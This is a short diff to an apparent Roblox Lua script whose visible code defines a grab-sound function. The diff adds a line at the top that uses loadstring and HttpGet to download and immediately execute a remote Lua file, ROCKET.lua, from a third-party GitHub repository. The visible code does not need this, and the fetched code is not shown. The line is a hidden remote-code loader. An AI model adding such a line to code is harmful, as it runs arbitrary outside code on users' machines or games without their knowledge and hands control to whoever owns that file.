@@ -1,4 +1,6 @@
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/4CBpanamera/script/refs/heads/main/ROCKET.lua'))()
+
 local function PlayGrabSound()
     local sound = Instance.new("Sound")
     sound.SoundId = "rbxassetid://140207837688369"
